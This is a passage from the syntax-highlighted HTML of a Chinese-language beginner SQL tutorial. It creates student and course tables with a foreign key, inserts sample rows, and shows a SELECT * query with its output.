class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-11\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-12\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-13\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-14\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-15\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">004</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-16\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0044 seconds] -->\r\n<p>现在数据库架构已经完成并添加了数据，现在是时候在数据库上运行查询了。</p>\n<h3 id=\"toc_4\">查询</h3>\n<p>查询遵循使用以下命令的集合结构：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f740053180199891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT &lt;attributes&gt;\r\nFROM &lt;entity&gt;\r\nWHERE &lt;condition&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740053180199891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740053180199891-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740053180199891-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f740053180199891-1\"><span class=\"crayon-v\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">attributes</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740053180199891-2\"><span class=\"crayon-v\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">entity</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740053180199891-3\"><span class=\"crayon-v\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">condition</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>要显示 <code>dbo_courses</code> 实体内的所有记录并显示课程代码和课程名称，请使用 <code>*</code> 。 这是一个通配符，它消除了键入所有属性名称的需要。（在生产数据库中不建议使用它。）此处查询的代码是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f740057407336686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT *\r\nFROM dbo_courses\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740057407336686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740057407336686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740057407336686-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f740057407336686-1\"><span class=\"crayon-e \">SELECT *</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740057407336686-2\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">dbo</span><span class=\"crayon-sy\">_</span>courses</div><div class=\"crayon-line\" id=\"crayon-5b4a81f740057407336686-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>此处查询的输出显示表中的所有元组，因此可显示所有可用课程：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f74005a527107985\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n| course_id |          course_name |\r\n|-----------|----------------------|\r\n|         1 | Software Engineering |\r\n|         2 |     Computer Science |\r\n|         3 |            Computing |\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005a527107985-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005a527107985-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005a527107985-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005a527107985-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005a527107985-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005a527107985-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f74005a527107985-1\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">course_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">course_name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005a527107985-2\"><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005a527107985-3\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Software </span><span class=\"crayon-v\">Engineering</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005a527107985-4\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-e\">Computer </span><span class=\"crayon-v\">Science</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005a527107985-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">Computing</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005a527107985-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>在后面的文章中，我将使用三种类型的连接之一来解释更复杂的查询：内连接、外连接和交叉连接。</p>\n<p>这是完整的脚本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f74005d622090945\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE dbo_students\r\n(\r\n  student_id INT(2) AUTO_INCREMENT NOT NULL,\r\n  student_name VARCHAR(50),\r\n  course_studied INT(2),\r\n  PRIMARY KEY (student_id)\r\n);\r\n\r\nCREATE TABLE dbo_courses\r\n(\r\n  course_id INT(2) AUTO_INCREMENT NOT NULL,\r\n  course_name VARCHAR(30),\r\n  PRIMARY KEY (course_id)\r\n);\r\n\r\nALTER TABLE dbo_students\r\nADD CONSTRAINT FK_course_studied\r\nFOREIGN KEY (course_studied) REFERENCES dbo_courses(course_id);\r\n\r\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(001,'Software Engineering');\r\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(002,'Computer Science');\r\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(003,'Computing');\r\n\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(001,'student1',001);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(002,'student2',002);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(003,'student3',002);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(004,'student4',003);\r\n\r\nSELECT *\r\nFROM dbo_courses\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74005d622090945-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74005d622090945-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_students</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-2\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">student_id </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AUTO_INCREMENT </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">student_name </span><span class=\"crayon-e\">VARCHAR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_studied </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-9\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_courses</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-10\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_id </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AUTO_INCREMENT </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_name </span><span class=\"crayon-e\">VARCHAR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-14\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-16\"><span class=\"crayon-e\">ALTER </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_students</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-17\"><span class=\"crayon-e\">ADD </span><span class=\"crayon-e\">CONSTRAINT </span><span class=\"crayon-e\">FK_course_studied</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-18\"><span class=\"crayon-e\">FOREIGN </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">REFERENCES </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-20\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-21\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Software Engineering'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-22\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-23\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Computer Science'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-24\"><span 